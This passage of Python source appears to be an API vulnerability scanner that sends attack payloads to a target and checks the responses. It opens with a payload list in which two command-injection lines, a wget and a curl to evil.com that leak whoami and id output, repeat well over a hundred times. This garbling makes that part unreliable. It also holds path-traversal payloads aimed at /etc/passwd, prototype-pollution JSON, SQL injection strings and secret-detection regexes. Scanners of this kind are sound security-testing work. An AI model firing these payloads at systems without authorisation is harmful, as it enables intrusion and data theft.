    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd"
]

JSON_INJECTION_PAYLOADS = [
    '{"test": "value", "admin": true}',
    '{"$ne": null}',
    '{"__proto__": {"admin": true}}',
    '{"constructor": {"prototype": {"admin": true}}}'
]

HTTP_VERBS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]

PII_PATTERNS = [
    r"[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}",  # Credit card
    r"[0-9]{12,16}",  # Credit card no dashes
    r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}",  # Email
    r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}",  # JWT
    r"[0-9]{3}-[0-9]{2}-[0-9]{4}",  # SSN
    r"pk_[a-zA-Z0-9]{24}",  # Stripe public key
    r"sk_[a-zA-Z0-9]{24}",  # Stripe secret key
    r"AKIA[0-9A-Z]{16}",  # AWS Access Key
    r"-----BEGIN [A-Z ]+-----",  # Private keys
    r"password\s*[:=]\s*['\"][^'\"]+['\"]",  # Password in response
    r"api[_-]?key\s*[:=]\s*['\"][^'\"]+['\"]"  # API keys
]

CANARY_URL = "http://canary.example.com/ssrf-test"

# Security checks categorized by severity
SECURITY_CHECKS = {
    'critical': [
        'https_check',
        'open_endpoints',
        'sql_injection',
        'command_injection',
        'xxe',
        'ssrf',
        'auth_bypass'
    ],
    'high': [
        'xss',
        'nosql_injection', 
        'ldap_injection',
        'path_traversal',
        'jwt_attacks',
        'mass_assignment',
        'insecure_deserialization',
        'business_logic'
    ],
    'medium': [
        'security_headers',
        'cors',
        'rate_limiting',
        'error_handling',
        'input_validation',
        'sensitive_data',
        'http_verb_tampering',
        'parameter_pollution',
        'timing_attacks',
        'information_disclosure'
    ]
}

# Import the comprehensive validator
try:
    from .false_positive_validator import FalsePositiveValidator
    validator = FalsePositiveValidator()
except ImportError:
    # Fallback to simple validation if validator module is not available
    validator = None

# Import the security layer detector
try:
    from .security_layer_detector import SecurityLayerDetector
    security_detector = SecurityLayerDetector()
except ImportError:
    # Fallback if security layer detector is not available
    security_detector = None

def is_false_positive(response, baseline_response=None, payload="", attack_type=""):
    """
    Comprehensive false positive detection function with advanced validation
    Returns True if the response indicates a false positive (secure), False if it's a real vulnerability
    """
    # Use advanced validator if available
    if validator:
        result = validator.validate_response(
            response=response,
            baseline_response=baseline_response,
            payload=payload,
            attack_type=attack_type
        )
        return result.is_false_positive
    
    # Use security layer detector if available
    if security_detector:
        security_results = security_detector.detect_security_layers(response, payload)
        if security_results:
            # If any security layer blocked the request, it's a false positive
            return True
    
    # Fallback to simple validation
    # Check for WAF block page indicators
    waf_indicators = ['<!doctype', '<html', '<head', '<body', 'cloudflare', 'access denied', 'forbidden', 'ray id', 'blocked', 'security']
    if any(waf_indicator in response.text.lower() for waf_indicator in waf_indicators):
        return True  # WAF block page = secure, not vulnerable
    
    # Check for 403 status (WAF block)
    if response.status_code == 403:
        return True  # WAF block = secure, not vulnerable
    
    # Check if response is identical to baseline (no change = false positive)
    if baseline_response and response.text == baseline_response.text:
        return True  # Identical response = false positive
    
    # Check if response is very similar to baseline (small difference = likely false positive)
    if baseline_response and len(response.text) < len(baseline_response.text) * 1.1:
        return True  # Small difference = likely false positive
    
    # Check for session expired responses
    if response.status_code == 440 or "session" in response.text.lower():
        return True  # Session expired = test inconclusive
    
    # Check for authentication errors
    if response.status_code in [401, 403] and any(auth_indicator in response.text.lower() for auth_indicator in ['unauthorized', 'forbidden', 'access denied']):
        return True  # Auth error = not a vulnerability
    
    return False  # Not a false positive, could be real vulnerability

def get_security_layer_info(response, payload=""):
    """
    Get detailed information about security layers that may have blocked the request
    Returns a formatted message about security blocks
    """
    if not security_detector:
        return "Security layer detection not available"
    
    security_results = security_detector.detect_security_layers(response, payload)
    return security_detector.format_block_message(security_results)

def get_checks_for_severity(severity):
    """Get list of checks to run based on severity level"""
    if severity == 'critical':
        return SECURITY_CHECKS['critical']
    elif severity == 'high':
        return SECURITY_CHECKS['critical'] + SECURITY_CHECKS['high']
    elif severity == 'medium':
        return SECURITY_CHECKS['critical'] + SECURITY_CHECKS['high'] + SECURITY_CHECKS['medium']
    else:  # 'all'
        all_checks = []
        for level in SECURITY_CHECKS.values():
            all_checks.extend(level)
        return all_checks

# Progress tracking is now handled by ProgressTracker class

def scan_api(api_url, curl_info=None, severity='all'):
    findings = {
        "open_endpoints": [],
        "auth": {},
        "sql_injection": [],
        "xss": [],
        "xxe": [],
        "nosql_injection": [],
        "ldap_injection": [],
        "command_injection": [],
        "path_traversal": [],
        "json_injection": [],
        "http_verb_tampering": {},
        "parameter_pollution": {},
        "mass_assignment": {},
        "jwt_attacks": {},
        "insecure_deserialization": {},
        "business_logic": {},
        "information_disclosure": {},
        "timing_attacks": {},
        "security_headers": {},
        "rate_limiting": {},
        "https": False,
        "cors": {},
        "error_handling": {},
        "input_validation": {},
        "sensitive_data": {},
        "ssrf": {},
    }

    # Get checks to run based on severity
    checks_to_run = get_checks_for_severity(severity)
    total_checks = len(checks_to_run)
    
    # Initialize progress tracker
    progress = ProgressTracker(total_checks)
    
    print(f"\n🔍 Running {total_checks} security checks for '{severity}' severity level")
    print(f"📋 Checks to run: {checks_to_run}")
    
    # Initialize basic info
    if 'https_check' in checks_to_run:
        progress.start_check("Checking HTTPS Protocol")
        findings["https"] = api_url.startswith("https://")
        progress.finish_check("Checking HTTPS Protocol")
        time.sleep(0.1)
    
    endpoints = [api_url]
    
    for idx, url in enumerate(endpoints):
        try:
            method = curl_info["method"] if curl_info else "GET"
            headers = curl_info["headers"].copy() if curl_info else {}
            data = curl_info["data"] if curl_info else None
            req_func = getattr(requests, method.lower(), requests.get)

            # Make initial request for baseline
            try:
                resp = req_func(url, headers=headers, data=data, timeout=5)
            except Exception as e:
                print(f"⚠️  Warning: Initial request failed: {e}")
                # Continue with a mock response
                resp = type('MockResponse', (), {'status_code': 500, 'text': '', 'headers': {}})()

            # 1. Open endpoint check
            if 'open_endpoints' in checks_to_run:
                progress.start_check("Testing Open Endpoint Access")
                if resp.status_code == 200:
                    findings["open_endpoints"].append(url)
                progress.finish_check("Testing Open Endpoint Access")

            # 2. Auth/Authorization checks
            if 'auth_bypass' in checks_to_run:
                progress.start_check("Testing Authentication Bypass")
                auth_findings = {}
                auth_headers = [k for k in headers if any(auth_term in k.lower() for auth_term in ['auth', 'token', 'session', 'cookie', 'bearer'])]
                if auth_headers:
                    # Try with no auth headers
                    no_auth_headers = {k: v for k, v in headers.items() if k not in auth_headers}
                    resp_no_auth = req_func(url, headers=no_auth_headers, data=data, timeout=5)
                    auth_findings['no_auth'] = resp_no_auth.status_code
                    # Try with invalid token
                    invalid_headers = headers.copy()
                    for k in auth_headers:
                        invalid_headers[k] = 'invalidtoken123'
                    resp_invalid = req_func(url, headers=invalid_headers, data=data, timeout=5)
                    auth_findings['invalid_token'] = resp_invalid.status_code
                findings['auth'][url] = auth_findings
                progress.finish_check("Testing Authentication Bypass")

            # 3. SQL Injection tests
            if 'sql_injection' in checks_to_run:
                progress.start_check("Testing SQL Injection Vulnerabilities")
                sqli_vulnerabilities = []
                
                # Enhanced SQL injection detection patterns
                sql_patterns = [
                    "' OR 1=1 --", "' OR '1'='1", "' UNION SELECT",
                    "'; DROP TABLE", "' OR 1=1#", "' OR 1=1/*",
                    "admin'--", "admin'#", "admin'/*",
                    "' OR 'x'='x", "' OR 1=1 OR '", "'; WAITFOR DELAY",
                    "' AND 1=1--", "' AND '1'='1", "1' OR '1' = '1'--",
                    "1' OR '1' = '1'#", "1' OR '1' = '1'/*",
                    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
                    "') OR ('1'='1", "') OR ('1'='1'--",
                    "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
                    "1' OR '1'='1'--", "1' OR '1'='1'#", "1' OR '1'='1'/*",
                    "' OR 1=1 OR '", "' OR 1=1 OR '1'='1",
                    "admin' OR '1'='1'--", "admin' OR 1=1--",
                    "admin' OR '1'='1", "admin' OR 1=1"
                ]
                
                # First, check existing URL parameters for SQL injection patterns
                if '?' in url:
                    from urllib.parse import urlparse, parse_qs, unquote
                    parsed_url = urlparse(url)
                    params = parse_qs(parsed_url.query)
                    
                    for param_name, param_values in params.items():
                        for value in param_values:
                            decoded_value = unquote(value)
                            
                            # Check for SQL injection patterns in existing parameters
                            for pattern in sql_patterns:
                                if pattern.lower() in decoded_value.lower():
                                    sqli_vulnerabilities.append(f"EXISTING_PARAM_{param_name}: {decoded_value} | SQL Injection Pattern: {pattern}")
                                    break
                
                # Test URL parameters (for GET requests or if URL has params)
                if method.upper() == 'GET' or '?' in url:
                    for payload in SQLI_PAYLOADS:
                        # Test existing URL parameters
                        if '?' in url:
                            # Add to existing parameters
                            sqli_url = url + f"&id={quote(payload)}"
                        else:
                            # Add new parameter
                            sqli_url = url + f"?id={quote(payload)}"
                        sqli_resp = req_func(sqli_url, headers=headers, data=data, timeout=5)
                        # Check if SQL indicators are found
                        found_indicators = []
                        
                        # Enhanced SQL injection detection
                        sql_indicators = [
                            'sql', 'mysql', 'oracle', 'postgresql', 'sqlite', 'mariadb',
                            'syntax error', 'warning', 'error in your sql syntax',
                            'mysql_fetch_array', 'mysql_fetch_object', 'mysql_num_rows',
                            'you have an error in your sql syntax', 'mysql error',
                            'oracle error', 'postgresql error', 'sqlite error',
                            'division by zero', 'stack trace', 'exception',
                            'unclosed quotation mark', 'incorrect syntax',
                            'invalid column name', 'table doesn\'t exist',
                            'column count doesn\'t match', 'duplicate entry'
                        ]
                        
                        # Use centralized false positive detection with payload and attack type
                        if is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                            continue  # Skip false positives
                        
                        # Check for SQL indicators (only if not a false positive)
                        for indicator in sql_indicators:
                            if indicator in sqli_resp.text.lower():
                                found_indicators.append(indicator)
                        
                        # Check for time-based SQL injection (delays)
                        if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                            start_time = time.time()
                            sqli_resp = req_func(sqli_url, headers=headers, data=data, timeout=15)
                            response_time = time.time() - start_time
                            # Only consider it a timing-based injection if response time > 8 seconds AND not a false positive
                            if response_time > 8:  # Increased threshold for timing-based injection
                                if not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                                    found_indicators.append('time_based_injection')
                        
                        # Check for boolean-based SQL injection (only if not a false positive)
                        if 'or 1=1' in payload.lower() or 'or \'1\'=\'1' in payload.lower():
                            if len(sqli_resp.text) > len(resp.text) * 1.5:  # More data returned
                                if not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                                    found_indicators.append('boolean_based_injection')
                        
                        # Check for successful SQL injection (only if not a false positive and significant difference)
                        if len(sqli_resp.text) > len(resp.text) * 1.3:  # 30% more data (increased threshold)
                            if not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                                found_indicators.append('successful_injection')
                        
                        # Check for SQL query in response (indicates successful injection)
                        if 'select' in sqli_resp.text.lower() and 'from' in sqli_resp.text.lower():
                            found_indicators.append('query_exposed')
                        
